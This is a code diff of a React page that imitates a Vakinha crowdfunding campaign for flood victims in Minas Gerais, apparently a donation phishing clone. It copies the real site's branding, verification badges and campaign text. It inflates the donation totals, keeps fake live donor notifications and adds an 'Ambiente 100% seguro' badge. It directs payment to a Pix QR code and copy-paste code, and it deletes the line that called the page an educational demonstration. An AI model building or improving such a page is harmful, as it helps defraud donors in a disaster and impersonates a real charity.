@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Search, Heart, Share, ShieldCheck, Copy, Check, Menu, X, MessageCircle, Facebook, Twitter, Link as LinkIcon } from 'lucide-react';
+import { Search, Heart, Share, ShieldCheck, Copy, Check, Menu, X, MessageCircle, Facebook, Twitter, Link as LinkIcon, ArrowLeft } from 'lucide-react';
 
 const DONOR_NAMES = [
   'Henrique', 'Ana', 'Carlos', 'Mariana', 'João', 'Beatriz', 'Lucas', 'Fernanda', 
@@ -21,11 +21,11 @@ export default function App() {
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   const [donationValue, setDonationValue] = useState('');
   const [notifications, setNotifications] = useState<DonationNotification[]>([]);
-  const [totalRaised, setTotalRaised] = useState(142000);
-  const [totalSupporters, setTotalSupporters] = useState(2184);
-  const [totalHearts, setTotalHearts] = useState(4532);
+  const [totalRaised, setTotalRaised] = useState(613115.68);
+  const [totalSupporters, setTotalSupporters] = useState(22731);
+  const [totalHearts, setTotalHearts] = useState(5528);
 
-  const GOAL_AMOUNT = 300000;
+  const GOAL_AMOUNT = 1000000;
   const progressPercent = Math.min((totalRaised / GOAL_AMOUNT) * 100, 100);
 
   useEffect(() => {
@@ -111,7 +111,7 @@ export default function App() {
       {notificationsUI}
       {/* Header */}
       <header className="bg-white shadow-sm sticky top-0 z-50">
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
           <div className="flex items-center">
             <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-8" referrerPolicy="no-referrer" />
           </div>
@@ -126,10 +126,15 @@ export default function App() {
             </button>
           </nav>
 
-          {/* Mobile Menu Toggle */}
-          <button className="md:hidden p-2 text-gray-600 hover:bg-gray-100 rounded-lg transition-colors" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
-            {mobileMenuOpen ? <X size={24} /> : <Menu size={24} />}
-          </button>
+          {/* Mobile Menu Toggle & Search */}
+          <div className="md:hidden flex items-center gap-4">
+            <button className="text-green-500 p-1">
+              <Search size={24} />
+            </button>
+            <button className="p-1 text-gray-600" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
+              {mobileMenuOpen ? <X size={28} /> : <Menu size={28} />}
+            </button>
+          </div>
         </div>
         
         {/* Mobile Nav */}
@@ -143,67 +148,89 @@ export default function App() {
       </header>
 
       {/* Main Content */}
-      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 pb-32 lg:pb-8">
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
           
           {/* Left Column */}
           <div className="lg:col-span-2 space-y-6">
             {/* Hero Image */}
-            <div className="relative rounded-2xl overflow-hidden aspect-video bg-gray-200 shadow-sm">
-              <img src="https://midias.em.com.br/_midias/jpg/2026/02/24/1200x720/1_juiz-de-fora-cemig-desmente-que-havera-interrupcao-geral-de-energia-64640530.jpeg?20260224185555?20260224185555" alt="Deslizamento e destruição" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
-              <button className="absolute top-4 right-4 bg-white/90 backdrop-blur-sm p-2.5 rounded-full shadow-md text-gray-400 hover:text-red-500 transition-colors">
-                <Heart size={24} />
-              </button>
+            <div className="relative rounded-2xl overflow-hidden aspect-[16/9] bg-gray-200 shadow-sm">
+              <img src="https://midias.em.com.br/_midias/jpg/2026/02/24/1200x720/1_juiz-de-fora-cemig-desmente-que-havera-interrupcao-geral-de-energia-64640530.jpeg?20260224185555?20260224185555" alt="SOS Enchentes Minas Gerais" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
+              {/* Texto sobreposto na imagem para simular a original */}
+              <div className="absolute inset-0 bg-black/20 flex flex-col justify-center p-6">
+                <h2 className="text-white font-black text-4xl leading-none tracking-tighter drop-shadow-lg">SOS<br/>ENCHENTES</h2>
+                <p className="text-white font-bold tracking-widest text-sm mt-1 drop-shadow-md">MINAS GERAIS</p>
+              </div>
             </div>
 
             {/* Title & Info */}
-            <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100">
-              <p className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">Emergências / Desastres</p>
-              <h1 className="text-3xl md:text-4xl font-extrabold text-gray-900 mb-4 leading-tight">
-                Ajude as Famílias Atingidas pela Enchente em Juiz de Fora – Solidariedade em Meio à Tragédia
+            <div className="bg-white p-4 sm:p-6 rounded-2xl shadow-sm border border-gray-100">
+              <p className="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-2">TRAGÉDIAS / DESASTRES / ACIDENTES</p>
+              <h1 className="text-2xl md:text-3xl font-bold text-[#002b49] mb-2 leading-tight">
+                SOS Minas Gerais
               </h1>
-              <p className="text-sm text-gray-500 font-medium mb-4">ID: 5965612</p>
-              <p className="text-gray-600 leading-relaxed text-lg">
-                Nos últimos dias, fortes chuvas atingiram a cidade de Juiz de Fora, em Minas Gerais, provocando uma das maiores tragédias recentes da região. As tempestades causaram enchentes e deslizamentos de terra que deixaram centenas de famílias desabrigadas.
-              </p>
-            </div>
+              <p className="text-xs text-gray-800 font-medium mb-6">ID: 5965746</p>
 
-            {/* Mobile Donation Card (Visible only on mobile) */}
-            <div className="lg:hidden bg-white rounded-2xl p-6 shadow-sm border border-gray-100">
               {/* Progress */}
-              <div className="mb-6">
-                <div className="h-2.5 bg-gray-100 rounded-full overflow-hidden mb-4">
-                  <div className="h-full bg-green-500 rounded-full relative transition-all duration-1000 ease-out" style={{ width: `${progressPercent}%` }}>
-                    <div className="absolute right-0 top-0 bottom-0 w-4 bg-white/20 skew-x-12"></div>
+              <div className="mb-4">
+                <div className="h-1 bg-gray-200 rounded-full overflow-hidden mb-4">
+                  <div className="h-full bg-[#00c853] rounded-full relative transition-all duration-1000 ease-out" style={{ width: `${progressPercent}%` }}>
                   </div>
                 </div>
-                <p className="text-sm font-bold text-gray-500 mb-1 uppercase tracking-wide">Arrecadado</p>
-                <h2 className="text-4xl font-extrabold text-green-500 mb-1 tracking-tight">
-                  {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(totalRaised)}
-                </h2>
-                <p className="text-sm text-gray-500 font-medium">
-                  de {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(GOAL_AMOUNT)}
-                </p>
+                <div className="flex items-baseline gap-2">
+                  <h2 className="text-xl sm:text-2xl font-bold text-[#00c853] tracking-tight">
+                    {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(totalRaised)}
+                  </h2>
+                  <p className="text-sm text-gray-500 font-medium">
+                    de {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(GOAL_AMOUNT)}
+                  </p>
+                </div>
               </div>
 
               {/* Stats */}
-              <div className="bg-green-50/50 rounded-xl p-4 mb-6 space-y-3 border border-green-100/50">
-                <div className="flex justify-between items-center text-sm">
-                  <span className="text-gray-600 flex items-center gap-1.5 font-medium">Corações Recebidos <Heart size={14} className="text-green-500" fill="currentColor" /></span>
-                  <span className="font-bold text-gray-900 bg-white px-2 py-0.5 rounded shadow-sm">
-                    {new Intl.NumberFormat('pt-BR').format(totalHearts)}
-                  </span>
+              <div className="bg-[#eefcf1] rounded-xl p-4 mb-6 space-y-3">
+                <div className="flex justify-between items-center text-xs">
+                  <span className="text-gray-800 flex items-center gap-1.5">Corações Recebidos <Heart size={14} className="text-[#00c853]" fill="currentColor" /></span>
+                  <span className="font-bold text-gray-900">{totalHearts}</span>
                 </div>
-                <div className="flex justify-between items-center text-sm">
-                  <span className="text-gray-600 font-medium">Apoiadores</span>
-                  <span className="font-bold text-gray-900 bg-white px-2 py-0.5 rounded shadow-sm">
-                    {new Intl.NumberFormat('pt-BR').format(totalSupporters)}
-                  </span>
+                <div className="flex justify-between items-center text-xs">
+                  <span className="text-gray-800">Apoiadores</span>
+                  <span className="font-bold text-gray-900">{totalSupporters}</span>
                 </div>
               </div>
 
+              <p className="text-xs text-gray-600 leading-relaxed mb-6">
+                SOS Minas Gerais: doe agora para vítimas das chuvas e deslizamentos. ATUALIZAÇÃO (27/02/2026, [11:40]): Minas Gerais enfrenta um ceário de EMERGÊNCIA após chuvas históricas. Segundo o Corpo de Bombeiros e a Defesa Civil, 58 óbitos já foram <a href="#" className="text-[#00c853] font-bold">ver tudo</a>
+              </p>
+
+              {/* Badges & Creator */}
+              <div className="border-t border-gray-100 pt-6">
+                <div className="bg-gray-50 rounded-xl p-3 flex items-center justify-between mb-4">
+                  <div className="flex gap-2">
+                    <div className="w-6 h-6 bg-red-500 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
+                    <div className="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
+                    <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
+                    <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
+                  </div>
+                  <a href="#" className="text-xs font-bold text-gray-700 underline">Ver selos</a>
+                </div>
+
+                <div className="bg-gray-50 rounded-xl p-4 flex items-center gap-3">
+                  <div className="w-10 h-10 bg-[#00c853] text-white rounded-full flex items-center justify-center font-bold text-xl shrink-0">
+                    N
+                  </div>
+                  <div>
+                    <p className="font-bold text-gray-900 text-sm flex items-center gap-1">Instituto Vakinha <Check size={14} className="text-white bg-[#00c853] rounded-full p-0.5" /></p>
+                    <p className="text-[10px] text-gray-500 mt-0.5">Ativo(a) desde março/2023</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* Mobile Donation Card (Visible only on mobile) */}
+            <div className="lg:hidden bg-white rounded-2xl p-4 sm:p-6 shadow-sm border border-gray-100">
               {/* Donation Form */}
-              <div className="mb-6">
+              <div className="mb-2">
                 <h3 className="font-bold text-gray-900 mb-3 text-sm uppercase tracking-wide">Escolha um valor para doar</h3>
                 <div className="grid grid-cols-2 gap-2 mb-3">
                   {['20', '50', '100', '200'].map(val => (
@@ -243,13 +270,13 @@ export default function App() {
             <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
               <div className="border-b border-gray-200 px-6 pt-2">
                 <nav className="flex gap-8 overflow-x-auto">
-                  {['Sobre', 'Atualizações', 'Quem ajudou'].map(tab => (
+                  {['Sobre', 'Sobre a ONG', 'Atualizações', 'Quem ajudou'].map(tab => (
                     <button
                       key={tab}
                       onClick={() => setActiveTab(tab.toLowerCase())}
                       className={`py-4 text-sm font-bold whitespace-nowrap border-b-2 transition-colors ${
                         activeTab === tab.toLowerCase() 
-                          ? 'border-green-500 text-green-600' 
+                          ? 'border-[#00c853] text-[#00c853]' 
                           : 'border-transparent text-gray-500 hover:text-gray-800 hover:border-gray-300'
                       }`}
                     >
@@ -262,26 +289,73 @@ export default function App() {
               {/* Tab Content */}
               <div className="p-6">
                 {activeTab === 'sobre' && (
-                  <div className="space-y-6 text-gray-700 leading-relaxed">
-                    <div className="prose max-w-none text-gray-600">
-                      <p className="text-sm font-bold text-gray-900 mb-4">Vaquinha criada em: <span className="font-normal text-gray-600">24/02/2026</span></p>
-                      <p className="mb-4">Nos últimos dias, fortes chuvas atingiram a cidade de Juiz de Fora, em Minas Gerais, provocando uma das maiores tragédias recentes da região. As tempestades causaram enchentes e deslizamentos de terra que deixaram 19 pessoas mortas, além de centenas de famílias desabrigadas.</p>
-                      <p className="mb-4">Diversos bairros foram atingidos, com casas destruídas, ruas alagadas e famílias que perderam praticamente tudo. Muitas vítimas estavam em áreas atingidas por deslizamentos, e equipes de resgate continuam trabalhando para ajudar quem foi afetado.</p>
+                  <div className="space-y-6 text-gray-700 leading-relaxed text-sm">
+                    <div className="prose max-w-none text-gray-800">
+                      <p className="mb-2">Você pode ajudar via Pix usando a chave:</p>
+                      <div className="flex items-center gap-2 mb-6">
+                        <span className="font-bold text-gray-900">sosminas@vakinha.com.br</span>
+                        <button onClick={handleCopyPix} className="text-gray-500 hover:text-gray-700">
+                          {copiedPix ? <Check size={16} className="text-green-500" /> : <Copy size={16} />}
+                        </button>
+                      </div>
+
+                      <div className="h-px bg-gray-200 w-full mb-6"></div>
+
+                      <p className="text-xs text-gray-600 mb-4">Vaquinha criada em: 24/02/2026</p>
                       
-                      <img src="https://www.otempo.com.br/content/dam/otempo/editorias/cidades/2026/2/cidades-juiz-de-fora-comerciantes--1772053247.jpeg" alt="Rua alagada e com lama" className="w-full rounded-xl my-6 object-cover shadow-sm" referrerPolicy="no-referrer" />
+                      <h2 className="text-xl font-black text-gray-900 mb-4">SOS Minas Gerais: doe agora para vítimas das chuvas e deslizamentos.</h2>
                       
-                      <p className="mb-4">De acordo com as autoridades, mais de 440 pessoas ficaram desabrigadas, e escolas precisaram ser transformadas em abrigos temporários para acolher moradores que perderam suas casas.</p>
-                      <p className="mb-4">Diante dessa situação tão difícil, criamos esta vaquinha solidária para ajudar as famílias atingidas pela tragédia. As doações arrecadadas serão destinadas para:</p>
-                      <ul className="list-disc pl-5 mb-4 space-y-2">
-                        <li>Compra de alimentos e água potável</li>
-                        <li>Roupas, cobertores e itens de higiene</li>
-                        <li>Apoio a famílias que perderam suas casas</li>
-                        <li>Ajuda emergencial para reconstrução e recomeço</li>
+                      <p className="mb-4">
+                        ATUALIZAÇÃO (27/02/2026, [11:40]): Minas Gerais enfrenta um ceário de EMERGÊNCIA após chuvas históricas. Segundo o Corpo de Bombeiros e a Defesa Civil, 58 óbitos já foram confirmados e mais de 4200 pessoas encontram-se desabrigadas. As cidades de Juiz de Fora e Ubá são as mais atingidas, com bairros inteiros soterrados e rios transbordados. Municípios como Matias Barbosa também sofrem com os impactos severos.
+                      </p>
+
+                      <p className="mb-6 flex items-start gap-2 bg-green-50 p-3 rounded-lg text-green-900 text-xs">
+                        <Check size={16} className="text-green-600 shrink-0 mt-0.5" />
+                        Esta é a vaquinha "SOS Minas Gerais" do Instituto Vakinha para levar ajuda emergencial aos afetados, com...
+                      </p>
+
+                      <h3 className="font-black text-gray-900 mb-2">OBJETIVO FINANCEIRO DA CAMPANHA:</h3>
+                      <ul className="list-disc pl-5 mb-6 space-y-1">
+                        <li>Valor: R$ 1.000.000,00</li>
+                        <li><strong>Importante:</strong> A meta não é limitante, valores adicionais serão igualmente direcionados às organizações parceiras em benefício dos afetados.</li>
                       </ul>
-                      <p className="mb-4">Cada contribuição, independente do valor, pode ajudar a levar esperança para quem está passando por um dos momentos mais difíceis da vida.</p>
-                      <p className="mb-2 font-bold text-yellow-600">💛 Se você puder contribuir, qualquer valor faz diferença.</p>
-                      <p className="mb-4 font-bold text-yellow-600">💛 Se não puder doar, compartilhe essa campanha para que mais pessoas possam ajudar.</p>
-                      <p className="font-bold text-gray-900 text-lg mt-6">Juntos podemos fazer a diferença e ajudar essas famílias a reconstruírem suas vidas.</p>
+
+                      <h3 className="font-black text-gray-900 mb-2">COMO SUA DOAÇÃO VIRA AJUDA?</h3>
+                      <p className="mb-2">Sua contribuição financia itens essenciais para quem perdeu tudo:</p>
+                      <ul className="list-disc pl-5 mb-6 space-y-1">
+                        <li>Apoio logístico às equipes de resgate nas áreas afetadas;</li>
+                        <li>Água potável, kits de higiene e limpeza;</li>
+                        <li>Cestas básicas e refeições prontas (segurança alimentar);</li>
+                        <li>Colchões, cobertores e roupas (ajuda emergencial);</li>
+                        <li>Instalação de abrigos provisórios para pessoas e animais.</li>
+                      </ul>
+
+                      <h3 className="font-black text-gray-900 mb-2">POR QUE DOAR AGORA?</h3>
+                      <p className="mb-6">Nas primeiras horas de uma tragédia, a velocidade salva vidas. Com o solo instável e o risco persistente, a necessidade de itens básicos cresce a cadadia.</p>
+
+                      <h3 className="font-black text-gray-900 mb-2">TRANSPARÊNCIA:</h3>
+                      <p className="mb-2">O Instituto Vakinha seleciona e acompanha organizações com idoneidade e capacidade local para execução no campo. Nesta campanha, vamos publicar:</p>
+                      <ul className="list-disc pl-5 mb-6 space-y-1">
+                        <li>1) Atualizações frequentes com data/hora;</li>
+                        <li>2) Metas e marcos de arrecadação;</li>
+                        <li>3) Descrição da destinação dos recursos;</li>
+                        <li>4) Relatório consolidado ao final.</li>
+                      </ul>
+
+                      <h3 className="font-black text-gray-900 mb-2">COMO AJUDAR (EM 2 MINUTOS):</h3>
+                      <ul className="list-disc pl-5 mb-6 space-y-1">
+                        <li>1) Doe qualquer valor pela página (R$ 25 já ajuda);</li>
+                        <li>2) Se preferir, doe via Pix:</li>
+                      </ul>
+
+                      <p className="mb-6 italic text-gray-600">Minas Gerais não pode esperar. Sua doação é o recomeço.</p>
+
+                      <h3 className="font-black text-gray-900 mb-2 uppercase">Organizações parceiras na campanha:</h3>
+                      <ul className="list-disc pl-5 mb-6 space-y-4">
+                        <li><strong>OIM:</strong> A Agência da ONU para as Migrações (OIM) é a principal agência da Organização das Nações Unidas (ONU) dedicada a garantir que a migração ocorra de forma ordenada, humana e segura. Atuando em frentes que vão do apoio em crises humanitárias ao auxílio em políticas migratórias nacionais, ela trabalha diretamente com governos e migrantes para proteger os direitos de quem se desloca, promover o desenvolvimento socioeconômico através da mobilidade e enfrentar os desafios práticos da gestão migratória global.</li>
+                        <li><strong>HUMUS:</strong> A HUMUS é uma organização brasileira do terceiro setor, sem fins lucrativos, especializada na gestão de desastres e na prestação de auxílio humanitário em situações de emergência extrema. Composta por profissionais técnicos e voluntários capacitados, a instituição atua de forma estratégica tanto na resposta imediata a catástrofes naturais — como inundações e deslizamentos — quanto na prevenção e mitigação de riscos, utilizando geotecnologias e treinamento especializado para salvar vidas e reconstruir a resiliência em comunidades vulneráveis.</li>
+                        <li><strong>GRABH:</strong> O GRABH (Grupo de Resgate Animal de Belo Horizonte) é uma organização técnica especializada em medicina veterinária de desastres e salvamento animal em cenários críticos, como enchentes, inundações e incêndios florestais. Composto por médicos veterinários e bombeiros civis capacitados em resgate técnico, o grupo atua de forma estratégica na Zona da Mata em 2026, focando na retirada de animais ilhados, feridos ou presos em estruturas colapsadas, aplicando protocolos científicos de triagem e manejo — fundamentais para reduzir o sofrimento animal e prevenir riscos sanitários (como zoonoses) — garantindo que a fauna doméstica e silvestre receba atendimento especializado enquanto as equipes oficiais priorizam as vítimas humanas.</li>
+                      </ul>
                     </div>
                   </div>
                 )}
@@ -329,6 +403,52 @@ export default function App() {
                   </div>
                 )}
               </div>
+            </div>
+
+            {/* Realização */}
+            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
+              <h3 className="font-black text-gray-900 mb-4 uppercase text-sm">Realização</h3>
+              <div className="flex items-center gap-4">
+                <div className="w-12 h-12 bg-[#00c853] text-white rounded-full flex items-center justify-center font-bold text-2xl shrink-0">
+                  N
+                </div>
+                <div>
+                  <p className="font-bold text-gray-900 flex items-center gap-1">Instituto Vakinha <Check size={14} className="text-white bg-[#00c853] rounded-full p-0.5" /></p>
+                  <p className="text-xs text-gray-500">Ativo(a) desde março/2023</p>
+                </div>
+              </div>
+            </div>
+
+            {/* FAQ */}
+            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
+              <h3 className="font-black text-gray-900 mb-4 uppercase text-sm">Tudo o que você precisa saber</h3>
+              <div className="space-y-4">
+                <div className="border-b border-gray-100 pb-4">
+                  <button className="w-full flex justify-between items-center text-left font-bold text-gray-900 text-sm">
+                    Como o Vakinha funciona?
+                    <span className="text-gray-400">+</span>
+                  </button>
+                </div>
+                <div className="border-b border-gray-100 pb-4">
+                  <button className="w-full flex justify-between items-center text-left font-bold text-gray-900 text-sm">
+                    É seguro doar pelo Vakinha?
+                    <span className="text-gray-400">+</span>
+                  </button>
+                </div>
+                <div className="pb-2">
+                  <button className="w-full flex justify-between items-center text-left font-bold text-gray-900 text-sm">
+                    Como posso ter certeza de que a campanha é verdadeira?
+                    <span className="text-gray-400">+</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            {/* Denunciar */}
+            <div className="text-center">
+              <button className="text-sm font-bold text-gray-500 hover:text-gray-700 underline">
+                Denunciar
+              </button>
             </div>
           </div>
 
@@ -445,6 +565,13 @@ export default function App() {
         </div>
       </main>
 
+      {/* Fixed Bottom Bar for Mobile */}
+      <div className="lg:hidden fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-4 z-40 shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.05)]">
+        <button onClick={() => setCurrentPage('payment')} className="w-full bg-[#00c853] hover:bg-green-600 text-white font-bold py-3.5 rounded-xl text-lg transition-colors shadow-md">
+          Doar Agora
+        </button>
+      </div>
+
       {/* Footer */}
       <footer className="bg-gray-900 text-gray-400 py-12 mt-12 border-t-4 border-green-500">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
@@ -494,69 +621,85 @@ function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValu
   };
 
   return (
-    <div className="min-h-screen bg-white flex flex-col items-center py-12 px-4 font-sans text-gray-800">
-      {/* Topo */}
-      <div className="flex items-center mb-12 cursor-pointer hover:opacity-80 transition-opacity" onClick={onBack}>
-        <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-8" referrerPolicy="no-referrer" />
-      </div>
+    <div className="min-h-screen bg-gray-50 flex flex-col items-center font-sans text-gray-800 pb-12">
+      {/* Header Fixo Checkout */}
+      <header className="bg-white shadow-sm sticky top-0 z-50 w-full">
+        <div className="max-w-md mx-auto px-4 h-16 flex items-center justify-between">
+          <button onClick={onBack} className="p-2 -ml-2 text-gray-600 hover:bg-gray-100 rounded-full transition-colors">
+            <ArrowLeft size={24} />
+          </button>
+          <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-7" referrerPolicy="no-referrer" />
+          <div className="w-10"></div> {/* Spacer para centralizar a logo */}
+        </div>
+      </header>
 
-      {/* Título */}
-      <div className="text-center mb-10">
-        <h1 className="text-3xl md:text-4xl font-extrabold text-gray-900 mb-3">Obrigado por ajudar! 💛</h1>
-        <p className="text-lg text-gray-600">Finalize sua doação via PIX</p>
-      </div>
-
-      {/* Card Central */}
-      <div className="bg-white w-full max-w-md rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.08)] border border-gray-100 p-8 mb-12">
-        {!pixGenerated ? (
-          <div className="space-y-6">
-            <div>
-              <label className="block text-sm font-bold text-gray-700 mb-2">Valor da doação</label>
-              <div className="relative">
-                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">R$</span>
-                <input 
-                  type="number" 
-                  placeholder="Digite o valor da sua doação" 
-                  value={value}
-                  onChange={(e) => setValue(e.target.value)}
-                  className="w-full pl-12 pr-4 py-4 border border-gray-200 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 outline-none font-bold text-gray-900 bg-gray-50 focus:bg-white transition-colors text-lg" 
-                />
-              </div>
-            </div>
-            <button 
-              onClick={() => setPixGenerated(true)}
-              disabled={!value || Number(value) <= 0}
-              className="w-full bg-orange-500 hover:bg-orange-600 disabled:bg-orange-300 text-white font-bold py-4 rounded-xl text-lg transition-all shadow-md hover:shadow-lg transform hover:-translate-y-0.5 duration-200"
-            >
-              Gerar PIX
-            </button>
+      <div className="w-full max-w-md px-4 mt-6">
+        {/* Info da Campanha */}
+        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-4 mb-6 flex items-center gap-4">
+          <img src="https://midias.em.com.br/_midias/jpg/2026/02/24/1200x720/1_juiz-de-fora-cemig-desmente-que-havera-interrupcao-geral-de-energia-64640530.jpeg?20260224185555?20260224185555" alt="Campanha" className="w-16 h-16 rounded-xl object-cover" referrerPolicy="no-referrer" />
+          <div>
+            <p className="text-xs text-gray-500 font-bold uppercase tracking-wider mb-1">Você está apoiando</p>
+            <h2 className="font-bold text-gray-900 leading-tight line-clamp-2">SOS Minas Gerais</h2>
           </div>
-        ) : (
-          <div className="flex flex-col items-center space-y-6 animate-in fade-in zoom-in duration-300">
-            <div className="p-4 bg-white border-2 border-orange-100 rounded-2xl shadow-sm">
-              <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126810014BR.GOV.BCB.PIX2559pix-qr.mercadopago.com%2Finstore%2Fol%2Fv2%2F3Z92i93aNMxHrzCRfSAqN15204000053039865802BR5907vakinha6009SAO%20PAULO62080504mpis6304C070" alt="QR Code PIX" className="w-48 h-48 rounded-lg" referrerPolicy="no-referrer" />
-            </div>
-            <p className="text-center text-gray-600 font-medium">Escaneie o QR Code ou copie a chave PIX abaixo</p>
-            
-            <div className="w-full space-y-3">
-              <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 text-center font-mono text-gray-800 font-bold break-all text-sm">
-                00020101021126810014BR.GOV.BCB.PIX2559pix-qr.mercadopago.com/instore/ol/v2/3Z92i93aNMxHrzCRfSAqN15204000053039865802BR5907vakinha6009SAO PAULO62080504mpis6304C070
+        </div>
+
+        {/* Card Central */}
+        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 mb-8">
+          {!pixGenerated ? (
+            <div className="space-y-6">
+              <div>
+                <label className="block text-sm font-bold text-gray-700 mb-2">Valor da doação</label>
+                <div className="relative">
+                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">R$</span>
+                  <input 
+                    type="number" 
+                    placeholder="0,00" 
+                    value={value}
+                    onChange={(e) => setValue(e.target.value)}
+                    className="w-full pl-12 pr-4 py-4 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#00c853] focus:border-[#00c853] outline-none font-bold text-gray-900 bg-gray-50 focus:bg-white transition-colors text-xl" 
+                  />
+                </div>
               </div>
               <button 
-                onClick={handleCopy}
-                className="w-full flex items-center justify-center gap-2 bg-orange-100 hover:bg-orange-200 text-orange-700 font-bold py-3.5 rounded-xl transition-colors"
+                onClick={() => setPixGenerated(true)}
+                disabled={!value || Number(value) <= 0}
+                className="w-full bg-[#00c853] hover:bg-green-600 disabled:bg-green-300 text-white font-bold py-4 rounded-xl text-lg transition-all shadow-md hover:shadow-lg transform hover:-translate-y-0.5 duration-200"
               >
-                {copied ? <Check size={20} /> : <Copy size={20} />}
-                {copied ? 'Chave copiada com sucesso!' : 'Copiar chave PIX'}
+                Continuar para o PIX
               </button>
             </div>
-          </div>
-        )}
-      </div>
+          ) : (
+            <div className="flex flex-col items-center space-y-6 animate-in fade-in zoom-in duration-300">
+              <div className="text-center">
+                <h3 className="font-black text-xl text-gray-900 mb-1">Quase lá!</h3>
+                <p className="text-sm text-gray-600">Copie o código abaixo para pagar no seu banco.</p>
+              </div>
 
-      {/* Rodapé Simples */}
-      <div className="mt-auto text-center text-sm text-gray-400">
-        <p>Esta é uma página demonstrativa para fins educacionais.</p>
+              <div className="p-4 bg-white border-2 border-green-100 rounded-2xl shadow-sm">
+                <img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=00020101021126810014BR.GOV.BCB.PIX2559pix-qr.mercadopago.com%2Finstore%2Fol%2Fv2%2F3Z92i93aNMxHrzCRfSAqN15204000053039865802BR5907vakinha6009SAO%20PAULO62080504mpis6304C070" alt="QR Code PIX" className="w-48 h-48 rounded-lg" referrerPolicy="no-referrer" />
+              </div>
+              
+              <div className="w-full space-y-3">
+                <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 text-center font-mono text-gray-800 font-bold break-all text-sm">
+                  00020101021126810014BR.GOV.BCB.PIX2559pix-qr.mercadopago.com/instore/ol/v2/3Z92i93aNMxHrzCRfSAqN15204000053039865802BR5907vakinha6009SAO PAULO62080504mpis6304C070
+                </div>
+                <button 
+                  onClick={handleCopy}
+                  className="w-full flex items-center justify-center gap-2 bg-[#eefcf1] hover:bg-green-100 text-[#00c853] font-bold py-3.5 rounded-xl transition-colors"
+                >
+                  {copied ? <Check size={20} /> : <Copy size={20} />}
+                  {copied ? 'Código copiado!' : 'Copiar código PIX'}
+                </button>
+              </div>
+            </div>
+          )}
+        </div>
+
+        {/* Security Badge */}
+        <div className="flex items-center justify-center gap-2 text-gray-500 text-sm font-medium">
+          <ShieldCheck size={18} className="text-[#00c853]" />
+          Ambiente 100% seguro
+        </div>
       </div>
     </div>
   );
